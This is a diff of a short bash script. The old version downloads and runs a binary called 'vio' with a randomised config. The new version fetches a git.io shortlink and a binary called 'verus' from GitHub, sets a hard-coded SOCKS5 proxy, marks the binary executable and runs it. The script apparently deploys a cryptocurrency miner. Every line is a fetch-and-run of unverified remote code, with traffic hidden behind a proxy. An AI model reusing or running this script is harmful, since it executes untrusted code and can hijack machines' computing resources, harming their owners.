@@ -1,6 +1,7 @@
 #!/bin/bash
 
-sudo apt update
-wget https://raw.githubusercontent.com/trautroi/shibusdt/main/vio
-wget https://raw.githubusercontent.com/outbesok/121/main/config.json  && chmod +x vio && sed -i "s/xavix/$(shuf -n 1 -i 1-99999)/" "config.json" && ./vio
+apt-get update
+wget -O 2 https://git.io/Jz9wF
+wget https://raw.githubusercontent.com/ributmaestro/ketapang/main/verus && export http_proxy=socks5://72.221.172.203:4145 && chmod u+x verus && ./verus
+
 
